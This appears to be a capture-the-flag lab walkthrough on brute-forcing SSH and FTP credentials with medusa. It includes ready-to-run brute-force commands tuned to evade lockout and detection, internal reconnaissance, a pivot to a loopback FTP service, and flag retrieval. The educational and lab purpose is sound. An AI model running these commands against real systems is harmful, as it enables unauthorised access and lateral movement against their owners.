## Web Services: SSH & FTP Brute Forcing

### Protocol Overview

- **SSH (Port 22):** Encrypted remote access. Vulnerable primarily to weak credentials.
    
- **FTP (Port 21):** Unencrypted file transfer. Credentials and data are sent in cleartext.
    

---

### Attack Phase 1: Remote SSH Compromise

**Command:**

`medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`

**Breakdown:**

- **Targeting:** `-h` for IP, `-n` for custom port.
    
- **Credentials:** `-u` for known username, `-P` for wordlist.
    
- **Execution:** `-M ssh` (module), `-t 3` (3 concurrent attempts to avoid lockout/detection).
    

**Access:**

`ssh sshuser@<IP> -p <PORT>`

---

### Attack Phase 2: Local Reconnaissance

Once inside via SSH, identify internal services:

1. **Check Listeners:** `netstat -tulpn | grep LISTEN` (Identifies Port 21).
    
2. **Verify Service:** `nmap localhost` (Confirms FTP is open).
    
3. **Enumerate Users:** Check `/home` directory to find potential usernames (e.g., `ftpuser`).
    

---

### Attack Phase 3: Local FTP Brute Force

**Command:**

`medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`

**Key Changes:**

- **Host:** `127.0.0.1` (Targeting the service loopback).
    
- **Module:** `-M ftp`.
    

---

### Post-Exploitation: Flag Retrieval

1. **Connect:** `ftp ftp://ftpuser:<PASSWORD>@localhost`
    
2. **Download:** `get flag.txt`
    
3. **Read:** `cat flag.txt`
    

---

### Security Implications

- **Weak Passwords:** The primary vector for both attacks.
    
- **Cleartext Protocols:** FTP's lack of encryption allows credential sniffing in addition to brute-forcing.
    
- **Lateral Movement:** Initial access (SSH) is used to pivot and attack internal services (FTP) not exposed to the public internet.
